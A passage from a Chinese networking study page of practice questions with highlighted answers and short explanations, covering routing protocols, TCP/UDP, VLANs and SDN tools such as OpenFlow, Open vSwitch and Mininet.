）。</p><p>A、数据链路层协议和物理层协议必须相同</p><p>B、数据链路层协议必须相同，而物理层协议可以不同</p><p>C、数据链路层协议可以不同，而物理层协议必须相同</p><p><font style="background: yellow ">D、数据链路层协议和物理层协议都可以不相同</font></p><p>10.在OSI参考模型中能实现路由选择、拥塞控制与互联功能的层是（ ）。</p><p>A、传输层</p><p>B、应用层</p><p><font style="background: yellow ">C、网络层</font></p><p>D、物理层</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：网络层的主要功能是基于网络层地址（IP地址）进行不同网络系统间的路径选择。网络层还可以实现拥塞控制、网际互连、信息包顺序控制及网络记账等功能。</span><br></pre></td></tr></table></figure><p>11.以下关于OSPF协议特征的描述中，错误的是（ ）。</p><p>A、OSPF协议将一个自治系统划分成若干个域，有一个特殊的域叫做骨干区域</p><p>B、域之间通过区域边界路由器互联</p><p>C、在自治系统中有4类路由器，即区域内部路由器、骨干路由器、区域边界路由器与AS边界路由器</p><p><font style="background: yellow ">D、骨干路由器不能兼作区域边界路由器</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：在骨干区域的边界，连接骨干区域与其他区域的路由器既是骨感路由器也是边界路由器。</span><br></pre></td></tr></table></figure><p>12.TCP&#x2F;IP网络中常用的距离矢量路由协议是（ ）。</p><p>A、ARP    </p><p>B、ICMP</p><p>C、OSPF</p><p><font style="background: yellow ">D、RIP</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解析：选项中只有OSPF和RIP是路由协议，OSPF是链路状态协议，而RIP</span><br><span class="line">是距离矢量协议。</span><br></pre></td></tr></table></figure><p>13.路由器一般工作在（ ）。</p><p>A、数据链路层</p><p>B、物理层</p><p><font style="background: yellow ">C、网络层</font></p><p>D、传输层</p><p>14.下面是某台路由器的路由表信息：<br>Destination&#x2F;Mask Proto Pre Cost Flags NextHop Interface<br>172.16.1.0&#x2F;24 OSPF 10 200 D 192.168.1.2 GE0&#x2F;0&#x2F;0<br>172.16.0.0&#x2F;16 Static 5 0 RD 192.168.1.2 GE0&#x2F;0&#x2F;0<br>172.16.1.0&#x2F;24 Static 80 0 RD 192.168.1.2 GE0&#x2F;0&#x2F;0<br>当有数据需要经由此路由器发往目的地172.16.1.1时，则会使用哪条路由?（ ）</p><p>A、优先级为5，开销值为0的静态路由172.16.0.0&#x2F;16。</p><p>B、优先级为80，开销值为0的静态路由172.16.0.0&#x2F;24。</p><p><font style="background: yellow ">C、优先级为10，开销值为200的OSPF路由172.16.1.0&#x2F;24。</font></p><p>D、由于两条静态路由的开销值相同，所以会被同时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：根据最长掩码匹配原则，选择掩码为24的两条路由，再根据优先级，选择优先级为10的路由，故选C。</span><br></pre></td></tr></table></figure><p>15.RIPv2使用下列哪一个IP地址来接收其他路由器发送的RIP路由信息？（ ）</p><p>A、224.0.0.5</p><p>B、224.0.0.6</p><p><font style="background: yellow ">C、224.0.0.9</font></p><p>D、255.255.255.255</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：而RIPv2报文为组播报文，组播地址为224.0.0.9。</span><br></pre></td></tr></table></figure><p>16.路由表中有4条路由10.0.0.0&#x2F;24、10.0.1.0&#x2F;24、10.0.2.0&#x2F;24、10.0.3.0&#x2F;24。如要进行路由聚合，则正确的聚合后路由是（ ）。</p><p><font style="background: yellow ">A、10.0.0.0&#x2F;22</font></p><p>B、10.0.0.0&#x2F;23</p><p>C、10.0.0.0&#x2F;24</p><p>D、10.0.0.0&#x2F;25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：0-3通过2位掩码就可以表示，故聚合后，网络位减少两位，掩码为22。</span><br></pre></td></tr></table></figure><p>17.在生成快速转发表的过程中，五元组是指（ ）。</p><p>A、源MAC地址、目的MAC地址、协议号、源IP地址、目的IP地址</p><p>B、物理接口、MAC地址、IP、地址、端口号、协议号</p><p><font style="background: yellow ">C、源IP地址、目的IP地址、源端口号、目的端口号、协议号</font></p><p>D、物理接口、源IP地址、目的IP地址、源端口号、目的端口号</p><p>18.某网络通过64Kbps的广域网链路连接到Internet。客户要求尽量高效地利用此链路的带宽。则应该使用（ ）连接到Internet。</p><p>A、BGP协议</p><p>B、OSPF协议</p><p>C、RIP协议</p><p><font style="background: yellow ">D、静态路由</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：带宽有限，所以使用静态路由就不会交互协议报文，减少对带宽的浪费。</span><br></pre></td></tr></table></figure><p>19.某路由器上启用了RIP协议，进程号为1，优先级为100；同时启用了OSPF协议，进程号为100，优先级为10。如果这两个进程同时学习到了10.0.0.0&#x2F;8网段的路由，度量值分别为1（跳数）和100（开销值），则哪个进程学习到的路由10.0.0.0&#x2F;8会进入IP路由表中？（ ）</p><p>A、RIP进程1</p><p><font style="background: yellow ">B、OSPF进程100</font></p><p>C、同时导入</p><p>D、无法判断</p><p>20.VPN的含义是（ ）。</p><p>A、增值网</p><p><font style="background: yellow ">B、虚拟专用网</font></p><p>C、企业内部网</p><p>D、企业外部网</p><p>21.以下关于TCP与UDP协议特点的比较中，错误的是（ ）。</p><p>A、TCP面向连接，UDP无连接</p><p>B、TCP基于字节流，UDP基于报文</p><p>C、TCP提供可靠的报文传输，UDP提供的是尽力而为地交付</p><p><font style="background: yellow ">D、TCP传输速率高于UDP传输速率</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：UDP协议是面向非连接的协议，TCP是面向连接的协议。因为UDP协议没有连接的过程，所以它的通信效率高，也正因为如此，它的可靠性不如TCP协议高。</span><br></pre></td></tr></table></figure><p>22.以下关于UDP协议适用范围的描述中，错误的是（ ）。</p><p><font style="background: yellow ">A、系统对性能的要求高低于对数据安全性的要求</font></p><p>B、需要“简短快捷”的数据交换</p><p>C、需要多播和广播的应用</p><p>D、适用于实时语音与视频传输的传输层协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：因为UDP协议没有连接的过程，所以它的通信效率高，也正因为如此，它的可靠性很低，不适合于对数据安全性高的场景。</span><br></pre></td></tr></table></figure><p>23.在Internet的基本服务功能中，远程登录所使用的命令是（ ）。</p><p>A、ftp</p><p><font style="background: yellow ">B、telnet</font></p><p>C、mail    </p><p>D、open</p><p>24.以下关于网络安全威胁发展的趋势的描述中错误的是（ ）。</p><p>A、趋利性是当前网络攻击的主要特点</p><p>B、网络攻击开始演变成某些国家或利益集团重要的政治、军事工具</p><p>C、网络攻击、病毒与垃圾邮件是网络安全的三大公害</p><p><font style="background: yellow ">D、云计算可以有效地防止网络攻击的发生</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：云计算（Cloud Computing）是基于互联网的相关服务的增加、使用和交互模式，通常涉及通过互联网来提供动态易扩展且经常是虚拟化的资源。无法防止网络攻击的发生.</span><br></pre></td></tr></table></figure><p>25.TFTP协议是基于（ ）的协议。</p><p><font style="background: yellow ">A、UDP</font></p><p>B、TCP</p><p>C、IPX</p><p>D、SSH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：TFTP协议是基于UDP协议的。它的端口号是69。</span><br></pre></td></tr></table></figure><p>26.ARP的请求和应答报文都是一对一的，这样可以进行正确解析。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：ARP的请求报文是广播报文，应答报文是一对一的（单播）。</span><br></pre></td></tr></table></figure><p>27.PPP协议工作过程中，PAP用密文传输用户与口令。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：PAP的密码以文本格式在电路上进行发送。</span><br></pre></td></tr></table></figure><p>28.VLAN建立在局域网交换机之上，它以软件方式实现逻辑工作组的划分与管理，逻辑工作组的结点组成不受物理位置的限制。</p><p> <font style="background: yellow ">对</font> 错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。</span><br></pre></td></tr></table></figure><p>29.生成树协议就是在交换网络中形成一个逻辑上的树形结构，从而避免某些物理上的环路形成的交换网中的无用帧形成的拥塞。</p><p> <font style="background: yellow ">对</font> 错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：STP协议（生成树协议）逻辑上断开环路，防止二层网络的广播风暴的产生。</span><br></pre></td></tr></table></figure><p>30.CHAP为三次握手协议，它通过在网络上以明文的方式传递用户名及口令来对用户进行验证。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：CHAP通过在网络上以密文方式传递验证信息。</span><br></pre></td></tr></table></figure><p>31.OSPF协议是一种内部网关协议。</p><p>  <font style="background: yellow ">对</font> 错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：OSPF(Open Shortest Path First开放式最短路径优先）是一个内部网关协议(Interior Gateway Protocol，简称IGP）。</span><br></pre></td></tr></table></figure><p>32.RARP的作用是将对方的MAC地址转换为IP地址。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：反向地址转换协议（Reverse Address Resolution Protocol）允许局域网的物理机器从网关服务器的ARP表或者缓存上请求其IP地址。</span><br></pre></td></tr></table></figure><p>33.若两台主机在同一子网中，则两台主机的IP地址分别与它们的子网掩码相“与”的结果一定相同。</p><p>   <font style="background: yellow ">对</font> 错</p><p>34.“三网融合”中的三网指的是电信网、核心网、互联网。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：指的是电信网、广播电视网、互联网。</span><br></pre></td></tr></table></figure><p>35.能隔离广播域的网元设备是二层交换机。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：考查路由交换基础，能隔离广播域的网元设备是路由器。</span><br></pre></td></tr></table></figure><p>36.路由器可以隔离冲突域，但不能隔离广播域。</p><p> 对 <font style="background: yellow ">错</font></p><p>解析：路由器既可以隔离冲突域，也可以隔离广播域。</p><p>37.在路由表里会出现的有下一跳地址、网络地址、度量值和MAC地址等。</p><p> 对 <font style="background: yellow ">错</font></p><p>38.当路由器接收的IP报文中的目标网络不在路由表中时，（没有缺省路由时）采取的策略是直接向支持广播的直连端口转发该报文。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：当路由器接收的IP报文中的目标网络不在路由表中且没有缺省路由时，直接丢弃该报文。</span><br></pre></td></tr></table></figure><p>39.解决路由环路问题的方式是重启路由器。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：重启路由器无用，可以有水平分割、触发更新、定义最大条数等方法来解决路由环路问题。</span><br></pre></td></tr></table></figure><p>40.RIP协议使用UDP协议来封装。</p><p>​    <font style="background: yellow ">对</font> 错</p><p>41.TCP是一个面向连接的协议，同时又引入了滑动窗口协议，TCP协议采用滑动窗口协议解决了端到端的流量控制和网络的拥塞控制。</p><p>​    <font style="background: yellow ">对</font> 错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：TCP的一项功能就是确保每个数据段都能到达目的地。位于目的主机的TCP服务对接受到的数据进行确认，并向源应用程序发送确认信息。</span><br></pre></td></tr></table></figure><p>42.IP层是TCP&#x2F;IP实现网络互连的关键，但IP层不提供可靠性保障，所以TCP&#x2F;IP网络中没有可靠性机制。</p><p> 对 <font style="background: yellow ">错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析：TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。所以说TCP是可靠的通信协议。</span><br></pre></td></tr></table></figure><br /><br /><h4 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a><font face="黑体" size=6><strong>SDN</strong></font></h4><p><strong>1.ONOS与 OpenDaylight是SDN模型中的（）</strong>**</p><p><strong>A、路由器</strong></p><p><strong>B、主机</strong></p><p><strong><font style="background: yellow ">C、控制器</font></strong></p><p><strong>D、交换机</strong></p><p><strong>2.SDN交换机基于（）实现转发</strong></p><p><strong>A、MAC地址表</strong></p><p><strong>B、路由表</strong></p><p><strong>C、IP表</strong></p><p><strong><font style="background: yellow ">D、流表</font></strong></p><p><strong>3.OpenFlow协议中Flow-Mod消息的作用是（ ）</strong></p><p><strong>A、控制信息</strong></p><p><strong>B、主机通讯</strong></p><p><strong><font style="background: yellow ">C、下发流表</font></strong></p><p><strong>D、交换机配置</strong></p><p><strong>4.OpenFlow协议是基于（）协议</strong></p><p><strong><font style="background: yellow ">A、TCP</font></strong></p><p><strong>B、UDP</strong></p><p><strong>C、ICMP</strong></p><p><strong>D、DNS</strong></p><p><strong>5.OpenFlow协议中交换机发送自身特性的报文是（ ）</strong></p><p><strong>A、echo_request</strong></p><p><strong><font style="background: yellow ">B、feature_reply</font></strong></p><p><strong>C、flow_mod</strong></p><p><strong>D、hello</strong></p><p><strong>6.当控制器与OpenFlow交换机版本协商后，控制器向OpenFlow交换机发送（ ）消息。</strong></p><p><strong>A、Packet_out</strong></p><p><strong>B、Hello</strong></p><p><strong>C、Get Config Request</strong></p><p><strong><font style="background: yellow ">D、Features Request</font></strong></p><p><strong><code>解析：当控制器与OpenFlow交换机版本协商后，控制器向OpenFlow交换机发送Features Request消息。</code></strong></p><p><strong>7.OpenDaylight Controller Lithium基于（ ）软件体系框架</strong></p><p><strong>A、IP</strong></p><p><strong>B、Java</strong></p><p><strong><font style="background: yellow ">C、Karaf</font></strong></p><p><strong>D、marve</strong></p><p><strong>8.通过Postman发送某条RESTCONF消息后，会返回状态码，下列哪个状态码表示消息成功发送（）</strong></p><p><strong><font style="background: yellow ">A、200</font></strong></p><p><strong>B、201</strong></p><p><strong>C、300</strong></p><p><strong>D、301</strong></p><p><strong>9.OpenvSwitch中列出所有网桥的命令是（）</strong></p><p><strong><font style="background: yellow ">A、ovs-vsctl list-br</font></strong></p><p><strong>B、ovs-vsctl list-port</strong></p><p><strong>C、ovs-vsctl show</strong></p><p><strong>D、ovs-vsctl del-br</strong></p><p><strong>10.对常用的流规则动作output:port描述正确的是（ ）</strong></p><p><strong>A、写数据到指定的字段</strong></p><p><strong>B、修改源或者目标的MAC地址信息</strong></p><p><strong><font style="background: yellow ">C、输出数据包到指定的端口，port是指端口的OpenFlow端口编号</font></strong></p><p><strong>D、修改源或者目标的IPv4地址信息</strong></p><p><strong>11.命令：mn –topo single,3 创建的topo是（ ）</strong></p><p><strong>A、3个交换机，一个主机</strong></p><p><strong>B、3个主机，3个交换机</strong></p><p><strong><font style="background: yellow ">C、3个主机，1个交换机</font></strong></p><p><strong>D、深度3，扇出3，树形</strong></p><p><strong>12.VxLAN是一种（ ）技术</strong></p><p><strong>A、路由</strong></p><p><strong><font style="background: yellow ">B、隧道</font></strong></p><p><strong>C、交换</strong></p><p><strong>D、加密</strong></p><p><strong>13.Postman请求状态表示成功的是（）</strong></p><p><strong>A、400</strong></p><p><strong><font style="background: yellow ">B、200</font></strong></p><p><strong>C、404</strong></p><p><strong>D、308</strong></p><p><strong>14.OpenvSwitch的核心模块是（）</strong></p><p><strong><font style="background: yellow ">A、ovs-vswitchd</font></strong></p><p><strong>B、ovsdb-server</strong></p><p><strong>C、datapath</strong></p><p><strong>D、ovs-ofctl</strong></p><p><strong>15.ovs-ofctl dump-flows br-sw命令作用是（）</strong></p><p><strong>A、显示网桥信息</strong></p><p><strong>B、显示所有端口</strong></p><p><strong><font style="background: yellow ">C、显示所有流表</font></strong></p><p><strong>D、显示OVS交换机信息</strong></p><p><strong>16.使用 OpenDaylight界面查看流表时使用的操作类型是（）</strong></p><p><strong><font style="background: yellow ">A、GET</font></strong></p><p><strong>B、PUT</strong></p><p><strong>C、POST</strong></p><p><strong>D、DELETE</strong></p><p><strong>17.Postman中L2层流表下发是指（）</strong></p><p><strong>A、网络层</strong></p><p><strong><font style="background: yellow ">B、数据链路层</font></strong></p><p><strong>C、传输层</strong></p><p><strong>D、应用层</strong></p><p><strong>18.OpenFlow协议用于（）通信</strong></p><p><strong>A、交换机与交换机</strong></p><p><strong><font style="background: yellow ">B、控制器与交换机</font></strong></p><p><strong>C、主机与主机</strong></p><p><strong>D、主机与交换机</strong></p><p><strong>19.OpenFlow协议的Flow-Mod消息的作用是（）</strong></p><p><strong>A、控制信息</strong></p><p><strong>B、主机通讯</strong></p><p><strong><font style="background: yellow ">C、下发流表</font></strong></p><p><strong>D、交换机配置</strong></p><p><strong>20.下列哪个报文有发现链路的功能（）</strong></p><p><strong>A、Flow-Mod</strong></p><p><strong>B、Port-Status</strong></p><p><strong><font style="background: yellow ">C、Packet-in&#x2F;out</font></strong></p><p><strong>D、Hello</strong></p><p><strong>21.在OpenFlow交换机中添加、删除或修改物理端口时，需要发送（）消息来通知OpenFlow控制器。</strong></p><p><strong><font style="background: yellow ">A、Port-Status消息</font></strong></p><p><strong>B、Role消息</strong></p><p><strong>C、Echo消息</strong></p><p><strong>D、Barrier消息</strong></p><p><strong>22.OVSDB协议对应的侦听端口是（）</strong></p><p><strong><font style="background: yellow ">A、6640</font></strong></p><p><strong>B、6633</strong></p><p><strong>C、6632</strong></p><p><strong>D、6642</strong></p><p><strong>23.OF-CONFIG协议的功能是（）</strong></p><p><strong>A、下发流表</strong></p><p><strong>B、转发数据包</strong></p><p><strong>C、订制协议</strong></p><p><strong><font style="background: yellow ">D、配置交换机</font></strong></p><p><strong>24.关于使用RESTCONF进行组表操作，下列说法不正确的是（）</strong></p><p><strong>A、使用RESTCONF下发组表时，请求类型应设为PUT</strong></p><p><strong><font style="background: yellow ">B、使用RESTCONF查看组表时，请求类型应设为POST</font></strong></p><p><strong>C、使用RESTCONF修改组表时，请求类型应设为PUT</strong></p><p><strong>D、使用RESTCONF删除组表时，请求类型应设为DELETE</strong></p><p><strong>25.VxLAN外层封装是OSI参考模型第几层（）</strong></p><p><strong>A、2</strong></p><p><strong>B、3</strong></p><p><strong><font style="background: yellow ">C、4</font></strong></p><p><strong>D、5</strong></p><p><strong><code>解析：VxLAN是MAC in UDP的网络虚拟化技术，所以其报文封装是在原始以太报文之前添加了一个UDP封装及VxLAN头封装，属于第4层。</code></strong></p><p><strong>26.SDN构架中的核心组件是（）</strong></p><p><strong><font style="background: yellow ">A、控制器</font></strong></p><p><strong>B、服务器</strong></p><p><strong>C、存储器</strong></p><p><strong>D、运算器</strong></p><p><strong>27.Postman中GET方法实现的功能是（）</strong></p><p><strong><font style="background: yellow ">A、请求数据</font></strong></p><p><strong>B、发送数据</strong></p><p><strong>C、删除数据</strong></p><p><strong>D、上传数据</strong></p><p><strong>28.Mininet软件的功能是（）</strong></p><p><strong>A、网络加速器</strong></p><p><strong><font style="background: yellow ">B、网络模拟器</font></strong></p><p><strong>C、拟交换机</strong></p><p><strong>D、虚拟路由器</strong></p><p><strong>29.Mininet中pingall命令的作用是（）</strong></p><p><strong>A、所有交换机互ping</strong></p><p><strong>B、控制器ping交换机</strong></p><p><strong>C、交换机ping主机</strong></p><p><strong><font style="background: yellow ">D、主机互ping</font></strong></p><p><strong>30.命令：mn –topo linear 4创建的拓扑是（）</strong></p><p><strong>A、4个控制器，4个主机</strong></p><p><strong><font style="background: yellow ">B、4个主机，4个交换机</font></strong></p><p><strong>C、4个控制器，4个交换机</strong></p><p><strong>D、4个主机无控制器</strong></p><p><strong>31.使用Postman删除流表时使用的操作类型是（）</strong></p><p><strong>A、GET</strong></p><p><strong>B、PUT</strong></p><p><strong>C、POST</strong></p><p><strong><font style="background: yellow ">D、DELETE</font></strong></p><p><strong>32.下面对OpenFlow相关消息说法错误的是（）</strong></p><p><strong>A、通过Packet-in&#x2F;Packet-out发现交换机之间的链路</strong></p><p><strong>B、在OpenFlow交换机中添加、删除或修改物理端口时，需要发送Port-Status消息来通知OpenFlow控制器</strong></p><p><strong><font style="background: yellow ">C、通过Get Config Request消息协商双方的OpenFlow版本号</font></strong></p><p><strong>D、OpenFlow控制器和OpenFlow交换机可通过发送Echo请求消息来确认二者之间是否连接、检测通信延迟、测量通信带宽等</strong></p><p><strong>33.关于组表结构描述不正确的是（）</strong></p><p><strong>A、组ID：用于表示组的识别符，根据该识别符使用各组</strong></p><p><strong><font style="background: yellow ">B、组类型：指定组的动作，分为all、select、indirect三种</font></strong></p><p><strong>C、计数器：记录通过该组表项处理的数据包数</strong></p><p><strong>D、行动桶：多个行动数据桶，各行动数据桶存储了多个执行动作和其对应的参数</strong></p><p><strong><code>解析：组类型：指定组的动作，分为all、select、indirect、fast failover四种。</code></strong></p><p><strong>34.关于OVSDB协议描述不正确的是（）</strong></p><p><strong>A、是一种管理配置协议，负责添加、删除、更新端口和隧道</strong></p><p><strong>B、具有灵活易懂、可扩展性强的特点</strong></p><p><strong>C、控制平面可以通过OVSDB Mgmt远程配置OVS的数据库OVSDB</strong></p><p><strong><font style="background: yellow ">D、OVSDB管理协议是目前为止唯一的OpenFlow配置协议</font></strong></p><p><strong>35.OF-CONFIG实现了对SDN交换机的功能是（）</strong></p><p><strong><font style="background: yellow ">A、配置协议</font></strong></p><p><strong>B、控制端口</strong></p><p><strong>C、下发流表</strong></p><p><strong>D、配置端口</strong></p><p><strong>36.GRE能够实现（）通信</strong></p><p><strong><font style="background: yellow ">A、点到点</font></strong></p><p><strong>B、多点到多点</strong></p><p><strong>C、点到多点</strong></p><p><strong>D、多点到点</strong></p><p><strong>37.查看网卡的Linux命令是（）</strong></p><p><strong>A、route</strong></p><p><strong>B、top</strong></p><p><strong>C、free</strong></p><p><strong><font style="background: yellow ">D、ifconfig</font></strong></p><p><strong>38.在SDN网络中，一个控制器可以管理多个交换机。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>39.软件定义网络（SDN）是对网络控制和转发功能进行去耦合的一种方法。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>40.SDN面向网络编程，传统方法面向设备编程。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>41.控制器通过下发流表来指导数据平面流量的转发。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>42.控制器与OpenFlow交换机之间相互发送Hello消息，用于协商双方的OpenFlow版本号。在双方支持的最高版本号不一致的情况下，协商的结果将以较高的OpenFlow版本为准。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>43.在连接过程中，控制器不断的发送OFPT_Echo_Request消息给交换机，确认交换机与控制器之间的连接状态。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>44.Mininet中的参数–switch用于选择交换机的种类，当不指定时默认就是ovsk即OpenvSwitch交换机。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>45.VXLAN技术是网络Overlay技术的一种实现通过采用MAC in UDP封装来延伸二层网络，实现了物理网络和虚拟网络解耦。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>46. YANG 是随着OpenFlow 协议而产生的数据建模语言。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：YANG 是随着 NETCONF 协议而产生的数据建模语言。</code></strong></p><p><strong>47.Port是OVS Bridge上创建的一个虚拟端口，每个Port都隶属于一个Bridge。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>48.Bridge代表一个以太网交换机(Switch)，一个主机中可以创建一个或者多个Bridge。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>49.OpenFlow控制器可以通过OpenFlow协议连接到任何支持OpenFlow的交换机。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>50.OpenFlow是开源的用于管理交换机流表的协议，是Controller和ovs-vswitched间的通信协议。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>51.执行命令ovs-vsctl del-br br0会将br0及挂接到br0上的端口一并删除。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>52.删除Open vSwitch上br0网桥上入端口为3的的流表项，应执行命令ovs-ofctl del-flows br0 in_port&#x3D;3。</strong></p><p> <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>53.查看Open vSwitch上br0网桥上的流表，应执行命令ovs-vsctl dump-flows br0。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>54.控制器通过Port-Status消息确保之前下发的消息已经被交换机执行完。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：控制器通过Barrier-Request消息确保之前下发的消息已经被交换机执行完。</code></strong></p><p><strong>55.OpenDaylight提供基本网络服务功能主要包括拓扑管理、状态管理、交换机管理、主机监测以及最短路径转发等。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>56.SDN交换机连接了底层交换设备与上层业务应用，可以看作SDN的整个大脑。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：SDN控制器连接了底层交换设备与上层业务应用，可以看作SDN的整个大脑。</code></strong></p><p><strong>57.SDN北向接口协议是集中式的控制平面和分布式的转发设备之间交互的接口协议。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：SDN南向接口协议是集中式的控制平面和分布式的转发设备之间交互的接口协议。</code></strong></p><p><strong>58.Mininet常用的网络构建参数–switch：用于选择交换机的种类，当不指定时默认是ovsk即OpenvSwitch交换机。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>59.在没有配置 OpenFlow 控制器的模式下，用户可以使用 ovs-ofctl 命令通过 OpenFlow 协议去连接 OVS，创建、修改或删除 OVS 中的流表项，并对 OVS 的运行状况进行动态监控。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>60.在 OVS 中，datapath 负责执行数据交换，也就是把从接收端口收到的数据包在流表中进行匹配，并执行匹配到的动作。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>61.OpenFlow流表的动作用于指示交换机在收到匹配的数据包后应该如何对其进行处理。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>62.OpenFlow流表的计数器可以针对交换机中的每张流表、每个数据流、每个设备端口、每个转发队列进行维护，用于统计数据流量的相关信息。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>63.交换机的一个接口可以对应多个主机MAC地址，一个MAC地址可以对应多个接口。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>64.安装OpenDaylight组件时必须要按照相关顺序进行安装。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>65.OpenDaylight是一个基于SDN开发的模块化、可扩展、可升级、支持多协议的控制器框架。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>66.使用OpenDaylight界面下发流表时，OpenFlow1.0协议只支持单流表，所以table id设置为1。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>67.一个报文在一个流表中只会匹配上一条流表项，一个流表项中可以同时存在多个匹配项。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>68.下发流表的Body体中，output-node-connector字段表示出端口。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>69.流表下发服务判断地址映射表中是否包含该目的MAC的映射条目，如果包含，则根据源MAC和目的MAC地址生成相应的流表项，并将其添加到MD-SAL的DataStore中。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>70.OpenFlow v1.3主要还增加了Meter表，用于控制关联流表的数据包的传送速率。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>71.OpenFlow交换机由流表、安全通道和OpenFlow协议三部分组成。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>72.OpenFlow交换机是整个OpenFlow网络的核心部件，主要管理数据层的转发。</strong></p><p> <strong><font style="background: yellow ">对</font>  